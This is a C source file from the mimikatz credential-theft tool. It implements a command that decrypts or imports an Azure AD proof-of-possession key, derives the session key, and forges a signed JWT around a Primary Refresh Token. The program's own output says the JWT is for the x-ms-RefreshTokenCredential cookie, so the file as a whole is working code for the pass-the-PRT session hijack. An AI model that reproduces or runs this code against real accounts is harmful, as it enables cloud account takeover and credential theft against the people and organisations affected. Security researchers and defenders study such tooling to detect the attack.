/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_cloudap.h"

NTSTATUS kuhl_m_dpapi_cloudap_keyvalue_derived(int argc, wchar_t * argv[])
{
	LPCWSTR szKeyValue, szContext, szLabel, szKeyName, szPrt, szIat, szDerivedKey;
	LPSTR sJWT;
	__time32_t time32 = 0;
	BOOL isValidContext = FALSE, isDerivedKey = FALSE;
	PKIWI_POPKEY pKeyValue;
	LPVOID pDataOut;
	DWORD cbKeyValue, dwDataOutLen;
	PKIWI_POPKEY_HARD pHard;
	BYTE Context[24], DerivedKey[32];
	NCryptBuffer buffer[] = {
		{0, KDF_LABEL, NULL},
		{sizeof(Context), KDF_CONTEXT, Context},
		{sizeof(NCRYPT_SHA256_ALGORITHM), KDF_HASH_ALGORITHM, NCRYPT_SHA256_ALGORITHM},
	};
	NCryptBufferDesc bufferDesc = {NCRYPTBUFFER_VERSION, ARRAYSIZE(buffer), buffer};

	if(kull_m_string_args_byName(argc, argv, L"context", &szContext, NULL))
	{
		isValidContext = kull_m_string_stringToHex(szContext, Context, sizeof(Context));
		if(!isValidContext)
			PRINT_ERROR(L"/context must be an hex string of 48 char (24 bytes) -- it will be random\n");
	}
	if(!isValidContext)
		CDGenerateRandomBits(Context, sizeof(Context));

	kull_m_string_args_byName(argc, argv, L"label", &szLabel, L"AzureAD-SecureConversation");
	if(buffer[0].pvBuffer = kull_m_string_unicode_to_ansi(szLabel))
	{
		buffer[0].cbBuffer = lstrlenA((LPCSTR) buffer[0].pvBuffer);
		kprintf(L"Label      : %.*S\nContext    : ", buffer[0].cbBuffer, buffer[0].pvBuffer);
		kull_m_string_wprintf_hex(buffer[1].pvBuffer, buffer[1].cbBuffer, 0);
		kprintf(L"\n");
		if(kull_m_string_args_byName(argc, argv, L"keyvalue", &szKeyValue, NULL))
		{
			if(lstrlen(szKeyValue) == (32 * 2))
			{
				if(kull_m_string_stringToHexBuffer(szKeyValue, (LPBYTE *) &pDataOut, &dwDataOutLen))
				{
					kprintf(L"Key type   : Software (RAW)\nClear key  : ");
					kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
					kprintf(L"\n");
					isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_software(&bufferDesc, (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
					LocalFree(pDataOut);
				}
				else PRINT_ERROR(L"Unable to convert from hex\n");
			}
			else if(lstrlen(szKeyValue) == (178 * 2))
			{
				if(kull_m_string_stringToHexBuffer(szKeyValue, (LPBYTE *) &pDataOut, &dwDataOutLen))
				{
					if(kull_m_string_args_byName(argc, argv, L"keyname", &szKeyName, NULL))
					{
						kprintf(L"Key type   : TPM protected (RAW)\nKey Name   : %s\nOpaque key : ", szKeyName);
						kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
						kprintf(L"\n");
						isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_hardware(&bufferDesc, szKeyName, (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
					}
					else PRINT_ERROR(L"An opaque key need a /keyname:SK-... to import it\n");
					LocalFree(pDataOut);
				}
				else PRINT_ERROR(L"Unable to convert from hex\n");
			}
			else if(kull_m_string_quick_urlsafe_base64_to_Binary(szKeyValue, (PBYTE *) &pKeyValue, &cbKeyValue))
			{
				if(kuhl_m_dpapi_unprotect_raw_or_blob(pKeyValue->key, cbKeyValue - FIELD_OFFSET(KIWI_POPKEY, key), NULL, argc, argv, NULL, 0, &pDataOut, &dwDataOutLen, NULL))
				{
					kprintf(L"Key type   : ");
					switch(pKeyValue->type)
					{
					case 1:
						kprintf(L"Software (DPAPI)\nClear key  : ");
						kull_m_string_wprintf_hex(pDataOut, dwDataOutLen, 0);
						kprintf(L"\n");
						isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_software(&bufferDesc, (LPCBYTE) pDataOut, dwDataOutLen, DerivedKey, sizeof(DerivedKey));
						break;
					case 2:
						pHard = (PKIWI_POPKEY_HARD) pDataOut;
						kprintf(L"TPM protected (DPAPI)\nKey Name   : %.*s\nOpaque key : ", pHard->cbName / sizeof(wchar_t), pHard->data);
						kull_m_string_wprintf_hex(pHard->data + pHard->cbName, pHard->cbKey, 0);
						kprintf(L"\n");
						isDerivedKey = kuhl_m_dpapi_cloudap_keyvalue_derived_hardware(&bufferDesc, (LPCWSTR) pHard->data, pHard->data + pHard->cbName, pHard->cbKey, DerivedKey, sizeof(DerivedKey));
						break;
					default:
						PRINT_ERROR(L"KeyValue type is not supported (%u)\n", pKeyValue->type);
					}
				}
				LocalFree(pKeyValue);
			}
			else PRINT_ERROR(L"Unable to decode base64\n");
		}
		else if(kull_m_string_args_byName(argc, argv, L"derivedkey", &szDerivedKey, NULL))
		{
			isDerivedKey = kull_m_string_stringToHex(szDerivedKey, DerivedKey, sizeof(DerivedKey));
			if(!isDerivedKey)
				PRINT_ERROR(L"a /derivedkey must be an hex string of 64 char (32 bytes)\n");
		}
		else  PRINT_ERROR(L"a /keyvalue:base64data (or raw 32/178 bytes in hex) must be present, or a /derivedkey");

		if(isDerivedKey)
		{
			kprintf(L"Derived Key: ");
			kull_m_string_wprintf_hex(DerivedKey, sizeof(DerivedKey), 0);
			kprintf(L"\n");

			if(kull_m_string_args_byName(argc, argv, L"prt", &szPrt, NULL))
			{
				if(kull_m_string_args_byName(argc, argv, L"iat", &szIat, NULL))
					time32 = wcstol(szIat, NULL, 0);
				else _time32(&time32);

				kprintf(L"Issued at  : %ld\n\nSigned JWT : ", time32);
				if(sJWT = generate_simpleSignature(Context, sizeof(Context), szPrt, &time32, DerivedKey, sizeof(DerivedKey)))
				{
					kprintf(L"%S\n\n(for x-ms-RefreshTokenCredential cookie by eg.)\n", sJWT);
					LocalFree(sJWT);
				}
			}
		}
	}
	return STATUS_SUCCESS;
}

BOOL kuhl_m_dpapi_cloudap_keyvalue_derived_software(PNCryptBufferDesc bufferDesc, LPCBYTE Key, DWORD cbKey, PBYTE DerivedKey, DWORD cbDerivedKey)
{
	BOOL status = FALSE;
	NTSTATUS bStatus;

	BCRYPT_ALG_HANDLE hAlgSP800108;
	BCRYPT_KEY_HANDLE hKeySP800108;
	DWORD ObjectLengthSP800108, cbResult;
	PUCHAR pbKeyObjectSP800108;

	__try
	{
		bStatus = BCryptOpenAlgorithmProvider(&hAlgSP800108, BCRYPT_SP800108_CTR_HMAC_ALGORITHM, NULL, 0);
		if(BCRYPT_SUCCESS(bStatus))
		{
			bStatus = BCryptGetProperty(hAlgSP800108, BCRYPT_OBJECT_LENGTH, (PUCHAR) &ObjectLengthSP800108, sizeof(ObjectLengthSP800108), &cbResult, 0);
			if(BCRYPT_SUCCESS(bStatus))
			{
				if(pbKeyObjectSP800108 = (PUCHAR) LocalAlloc(LPTR, ObjectLengthSP800108))
				{
					bStatus = BCryptGenerateSymmetricKey(hAlgSP800108, &hKeySP800108, pbKeyObjectSP800108, ObjectLengthSP800108, (PUCHAR) Key, cbKey, 0);
					if(BCRYPT_SUCCESS(bStatus))
					{
						bStatus = BCryptKeyDerivation(hKeySP800108, bufferDesc, DerivedKey, cbDerivedKey, &cbResult, 0);
						if(BCRYPT_SUCCESS(bStatus))
						{
							status = (cbResult == cbDerivedKey);
							if(!status)
								PRINT_ERROR(L"Bad cbResult (%u vs %u)\n", cbResult, cbDerivedKey);
						}
						else PRINT_ERROR(L"BCryptKeyDerivation: 0x%08x\n", bStatus);
						BCryptDestroyKey(hKeySP800108);
					}
					else PRINT_ERROR(L"BCryptGenerateSymmetricKey: 0x%08x\n", bStatus);
					LocalFree(pbKeyObjectSP800108);
				}
			}
			else PRINT_ERROR(L"BCryptGetProperty: 0x%08x\n", bStatus);
			BCryptCloseAlgorithmProvider(hAlgSP800108, 0);
		}
		else PRINT_ERROR(L"BCryptOpenAlgorithmProvider: 0x%08x\n", bStatus);
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
	{
		PRINT_ERROR(L"No CNG?\n");
	}
	return status;
}

BOOL kuhl_m_dpapi_cloudap_keyvalue_derived_hardware(PNCryptBufferDesc bufferDesc, LPCWSTR TransportKeyName, LPCBYTE Key, DWORD cbKey, PBYTE DerivedKey, DWORD cbDerivedKey)
{
	BOOL status = FALSE;
	SECURITY_STATUS nStatus;
	NCRYPT_PROV_HANDLE hProvider;
	NCRYPT_KEY_HANDLE hImportKey, hKey;
	DWORD cbResult;
	PNCRYPTKEYDERIVATION NCryptKeyDerivation; // tofix

	__try
	{
		nStatus = NCryptOpenStorageProvider(&hProvider, MS_PLATFORM_CRYPTO_PROVIDER, 0);
		if(nStatus == ERROR_SUCCESS)
		{
			nStatus = NCryptOpenKey(hProvider, &hImportKey, TransportKeyName, 0, 0);
			if(nStatus == ERROR_SUCCESS)
			{
				nStatus = NCryptImportKey(hProvider, hImportKey, NCRYPT_OPAQUETRANSPORT_BLOB, NULL, &hKey, (PBYTE) Key, cbKey, 0);
				if(nStatus == ERROR_SUCCESS)
				{
					NCryptKeyDerivation = (PNCRYPTKEYDERIVATION) GetProcAddress(GetModuleHandle(L"ncrypt.dll"), "NCryptKeyDerivation"); // tofix
					nStatus = NCryptKeyDerivation(hKey, bufferDesc, DerivedKey, cbDerivedKey, &cbResult, 0);
					if(nStatus == ERROR_SUCCESS)
					{
						status = (cbResult == cbDerivedKey);
						if(!status)
							PRINT_ERROR(L"Bad cbResult (%u vs %u)\n", cbResult, cbDerivedKey);
					}
					else PRINT_ERROR(L"NCryptKeyDerivation: 0x%08x\n", nStatus);
					NCryptFreeObject(hKey);
				}
				else PRINT_ERROR(L"NCryptImportKey: 0x%08x\n", nStatus);
				NCryptFreeObject(hImportKey);
			}
			else PRINT_ERROR(L"NCryptOpenKey: 0x%08x\n", nStatus);
			NCryptFreeObject(hProvider);
		}
		else PRINT_ERROR(L"NCryptOpenStorageProvider: 0x%08x\n", nStatus);
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
	{
		PRINT_ERROR(L"No CNG?\n");
	}
	return status;
}

PSTR basicEscapeJson(PCSTR toEscape)
{
	DWORD i, j, lenEscaped;
	PSTR ret = NULL;

	j = lenEscaped = lstrlenA(toEscape);
	for(i = 0; i < j; i++)
	{
		if((toEscape[i] == '\"') || (toEscape[i] == '/') || (toEscape[i] == '\\'))
			lenEscaped++;
	}

	if(ret = (PSTR) LocalAlloc(LPTR, lenEscaped + 1))
	{
		for(i = 0, j = 0; j < lenEscaped; i++, j++)
		{
			if((toEscape[i] == '\"') || (toEscape[i] == '/') || (toEscape[i] == '\\'))
				ret[j++] = '\\';
			ret[j] = toEscape[i];
		}
	}

	return ret;
}

PSTR generate_simpleHeader(PCSTR Alg, LPCBYTE Context, DWORD cbContext)
{
	PSTR base64 = NULL, header, ctxBase64, escapedCtxBase64;

	if(kull_m_string_quick_binary_to_base64A(Context, cbContext, &ctxBase64))
	{
		if(escapedCtxBase64 = basicEscapeJson(ctxBase64))
		{
			if(kull_m_string_sprintfA(&header, "{\"alg\":\"%s\", \"ctx\":\"%s\"}", Alg, escapedCtxBase64))
			{
				kull_m_string_quick_binary_to_urlsafe_base64A((const BYTE *) header, lstrlenA(header), &base64);
				LocalFree(header);
			}
			LocalFree(escapedCtxBase64);
		}
		LocalFree(ctxBase64);
	}
	return base64;
}

PSTR generate_simplePayload(PCWSTR PrimaryRefreshToken, __time32_t *iat)
{
	PSTR base64 = NULL, payload, prtDec, escapedPrt;
	PBYTE data;
	DWORD cbData;
	__time32_t time32;

	if(iat)
		time32 = *iat;
	else _time32(&time32);

	if(kull_m_string_quick_urlsafe_base64_to_Binary(PrimaryRefreshToken, &data, &cbData))
	{
		if(prtDec = (PSTR) LocalAlloc(LPTR, cbData + 1))
		{
			RtlCopyMemory(prtDec, data, cbData);
			if(escapedPrt = basicEscapeJson(prtDec))
			{
				if(kull_m_string_sprintfA(&payload, "{\"refresh_token\":\"%s\", \"is_primary\":\"true\", \"iat\":\"%ld\"}", escapedPrt, time32))
				{
					kull_m_string_quick_binary_to_urlsafe_base64A((const BYTE *) payload, lstrlenA(payload), &base64);
					LocalFree(payload);
				}
				LocalFree(escapedPrt);
			}
			LocalFree(prtDec);
		}
		LocalFree(data);
	}
	return base64;
}

const char cPoint = '.';
PSTR generate_simpleSignature(LPCBYTE Context, DWORD cbContext, PCWSTR PrimaryRefreshToken, __time32_t *iat, LPCBYTE Key, DWORD cbKey)
{
	PSTR jwt = NULL, header64, payload64, signature64;
	NTSTATUS status;
	BCRYPT_ALG_HANDLE hAlgorithm;
	BCRYPT_HASH_HANDLE hHash;
	DWORD ObjectLength, cbResult;
	PUCHAR pbHashObject;
	BYTE Hash[32];

	if(header64 = generate_simpleHeader("HS256", Context, cbContext))
	{
		if(payload64 = generate_simplePayload(PrimaryRefreshToken, iat))
		{
			__try
			{
				status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_SHA256_ALGORITHM, MS_PRIMITIVE_PROVIDER, BCRYPT_ALG_HANDLE_HMAC_FLAG);
				if(BCRYPT_SUCCESS(status))
				{
					status = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PUCHAR) &ObjectLength, sizeof(ObjectLength), &cbResult, 0);
					if(BCRYPT_SUCCESS(status))
					{
						if(pbHashObject = (PUCHAR) LocalAlloc(LPTR, ObjectLength))
						{
							status = BCryptCreateHash(hAlgorithm, &hHash, pbHashObject, ObjectLength, (PUCHAR) Key, cbKey, 0);
							if(BCRYPT_SUCCESS(status))
							{
								BCryptHashData(hHash, (PUCHAR) header64, lstrlenA(header64), 0);
								BCryptHashData(hHash, (PUCHAR) &cPoint, sizeof(cPoint), 0);
								BCryptHashData(hHash, (PUCHAR) payload64, lstrlenA(payload64), 0);
								status = BCryptFinishHash(hHash, Hash, sizeof(Hash), 0);
								if(BCRYPT_SUCCESS(status))
								{
									if(kull_m_string_quick_binary_to_urlsafe_base64A(Hash, sizeof(Hash), &signature64))
									{
										kull_m_string_sprintfA(&jwt, "%s.%s.%s", header64, payload64, signature64);
										LocalFree(signature64);
									}
								}
								else PRINT_ERROR(L"BCryptFinishHash: 0x%08x\n", status);

								BCryptDestroyHash(hHash);
							}
							else PRINT_ERROR(L"BCryptCreateHash: 0x%08x\n", status);
							LocalFree(pbHashObject);
						}
					}
					else PRINT_ERROR(L"BCryptGetProperty: 0x%08x\n", status);
					BCryptCloseAlgorithmProvider(hAlgorithm, 0);
				}
				else PRINT_ERROR(L"BCryptOpenAlgorithmProvider: 0x%08x\n", status);
			}
			__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
			{
				PRINT_ERROR(L"No CNG?\n");
			}
			LocalFree(payload64);
		}
		LocalFree(header64);
	}
	return jwt;
}